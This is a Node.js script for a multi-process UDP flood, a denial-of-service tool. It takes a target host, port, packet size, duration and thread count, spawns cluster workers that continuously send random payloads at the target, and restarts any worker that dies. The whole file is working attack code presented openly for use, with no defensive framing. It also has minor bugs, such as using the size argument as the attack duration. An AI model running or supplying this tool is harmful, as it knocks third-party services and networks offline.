/*
    Must run with Node version 16.x.x or later. ESX mode requires a minimum of version 14+.
    - Fully featured string to destination user datagram flood.
*/

import dgram from 'node:dgram';
import cluster from 'node:cluster'; // multi-threading library.
const sock = dgram.createSocket('udp4');

// if the user specifies 0, we will modify the value of our process arguments randomly.
process.argv[3] = process.argv[3] == 0 ? Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024 : process.argv[3];
process.argv[4] = process.argv[4] == 0 ? Math.floor(Math.random() * (1428 - 1024 + 1)) + 5 : process.argv[4];

function randStr(size) {
    let buffer = [];
    for (let b = 0; b < size; b++) {
      buffer[b] = String.fromCharCode(Math.floor(Math.random() * 26) + 65);
    } return buffer.join('');
}

// generate the random alphanum string to send.
const attackBuffer = randStr(parseInt(process.argv[4]));

function udpFlood(host, port, length) {
    sock.send(attackBuffer, 0, length, port, host, (err) => {
        if (err !== null) {
            console.error(`Error encountered!: ${err}`);
        }
    });
}

if (cluster.isPrimary) {
    if (process.argv.length < 6) {
        console.log(`Usage: node ${process.argv[1]} [host] [port, (0 for random)] [size, (0 for random)] [time] [extra-threads]`);
        process.exit(1);
    } else {
        console.log(`Host: ${process.argv[2]}\nPort: ${process.argv[3] == 0 ? "random" : process.argv[3]}\nSize: ${process.argv[4] == 0 ? "random" : process.argv[4]}\nTime: ${process.argv[5]}\nThreads: ${process.argv[6]}`);
    }

    for (let threads = 0; threads < process.argv[6]; threads++) {
        const worker = cluster.fork();
        worker.setMaxListeners(0);
        worker.send({ message: "start" });
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died with code ${code} and signal ${signal}`);
        const newWorker = cluster.fork();
        newWorker.setMaxListeners(0);
        newWorker.send({ message: "start" });
    });
} else {
    process.on('message', (msg) => {
        if (msg.message === "start") {
            let flood = setInterval(() => {
                udpFlood(process.argv[2], parseInt(process.argv[3]), parseInt(process.argv[4]));
            });

            setTimeout(() => {
                clearInterval(flood);
                console.log("The atack has ended!\n");
                process.exit(1);
            }, process.argv[4] * 1000);
        }
    });
}
